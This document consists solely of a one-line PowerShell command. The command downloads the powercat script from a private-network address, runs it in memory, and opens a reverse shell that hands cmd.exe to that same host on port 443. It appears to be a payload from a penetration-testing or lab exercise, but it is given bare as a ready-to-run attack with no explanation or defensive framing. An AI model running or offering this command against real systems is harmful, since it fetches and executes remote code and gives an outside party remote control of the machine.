powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.46.2/powercat.ps1');powercat -c 192.168.46.2 -p 443 -e cmd"
